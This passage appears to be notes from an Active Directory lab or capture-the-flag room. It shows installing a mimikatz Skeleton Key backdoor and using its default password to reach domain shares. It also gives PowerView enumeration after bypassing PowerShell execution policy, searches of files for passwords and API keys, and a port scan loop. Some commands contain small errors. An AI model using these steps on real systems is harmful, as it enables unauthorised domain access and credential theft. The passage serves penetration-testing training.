1.) cd Downloads && mimikatz.exe - Navigate to the directory mimikatz is in and run mimikatz

2.) privilege::debug - This should be a standard for running mimikatz as mimikatz needs local administrator access
```

![image](https://user-images.githubusercontent.com/89842187/131739359-11f2055c-3364-4f77-aeec-85af27606d58.png)

## Installing the Skeleton Key w/ mimikatz 

```
1.) misc::skeleton - Yes! that's it but don't underestimate this small command it is very 

```

![image](https://user-images.githubusercontent.com/89842187/131739393-5cdbcacc-c4f7-4326-92d5-add1c5da8ffc.png)

## Accessing the forest

The default credentials will be: "mimikatz"
```
example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
```
The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.


## Enumeration w/ Powerview

Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.

We'll be focusing on how to start up and get users and groups from PowerView.

I have already taken the time and put PowerView on the machine


```
1.) Start Powershell - powershell -ep bypass -ep bypasses the execution policy of powershell allowing you to easily run scripts

```
![image](https://user-images.githubusercontent.com/89842187/131857694-22a6785e-b0e7-43bc-8521-26e019027d62.png)

```
2.) Start PowerView - . .\Downloads\PowerView.ps1
3.) Enumerate the domain users - Get-NetUser | select cn    
```

![image](https://user-images.githubusercontent.com/89842187/131857737-224ed15c-0231-4947-8f14-a0c488c49627.png)

```
4.) Enumerate the domain groups - Get-NetGroup -GroupName *admin*    
```
![image](https://user-images.githubusercontent.com/89842187/131857756-1d6b07d5-a6e0-4fd1-bd6d-8ff6367dd5c3.png)



## Basic

 ```
 powershell -ep bypass #  load a powershell shell with execution policy bypassed
 Get-NetComputer -fulldata | select operatingsystem # gets a list of all operating systems on the domain
 Get-Help Get-Command -Examples #Information particular command
 Get-NetUser | select cn #gets a list of all users on the domain
 Get-Command New-* #Todos los cmdlets instalados
 Get-Service | Where-Object -Property Status -eq Stopped #Stopped services
 Get-Command | Where-Object -Property CommandType -eq Cmdlet | measure #CMDLETS Installed
 Get-ChildItem -Path C:/ -Name interesting-file.txt -Recurse -File #encontrar archivo
 Get-Content "C:\Program Files\interesting-file.txt.txt" #Get Contents
 Get-FileHash -Path "C:\Program Files\interesting-file.txt.txt" -Algorithm MD5 #Get Hash
 Get-Location or pwd #Current working directory
 Get-Location -Path "C:\Users\Administrator\Documents\Passwords" # IT EXISTS?
 Invoke-WebRequest # Peticion web
 certutil -decode "C:\Users\Administrator\Desktop\b64.txt" out.txt #Decode

 ```
 
 ## Enumeration
 
```
Get-LocalUser  #How many users are there on the machine?
Get-LocalUser | Where-Object -Property PasswordRequired -Match false # How many users have their password required values set to False?
Get-LocalGroup | measure # How many local groups exist?
Get-ADGroup -Filter * | Get groups
Get-NetIPAddress # IP address info?
Get-NetTCPConnection # How many ports are listed as listening?
GEt-NetTCPConnection | Where-Object -Property State -Match Listen | measure # How many ports are listed as listening?
Get-Hotfix | measure #How many patches have been applied?
Get-Hotfix # When was the patch with ID KB4023834 installed?
Get-Hotfix -Id KB4023834
Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue # Find the contents of a backup file.
Search for all files containing API_KEY # Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY
Get-Process #List running procceses
Get-ScheduleTask #Scheduled tasks
Get-ScheduleTask -TaskName new-sched-task #path to new-sched-task
Get-Acl c:/ #Who is the owner of the C:\
 ```
 
 
 ## Scripting
 Look for Password string
 ```
$path = 'C:\Users\restr\Desktop*'
$magic_word = 'password'
$exec = Get-ChildItem $path -recurse | Select-String -pattern $magic_word
echo $exec

 ```
 
 ## Files contains an HTTPs Link?
 
 ```

$path = "C:\Users\Administrator\Desktop\emails\*"
$string_pattern = "https://"
$command = Get-ChildItem -Path $path -Recurse | Select-String -Pattern $String_pattern
echo $command
 ```
 
 
## Open Ports
 
 ```
 for($i=1; $i -le 65553; $i++){
    Test-NetConnection localhost -Port $i
}
 ```


Here's a cheatsheet to help you with commands: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

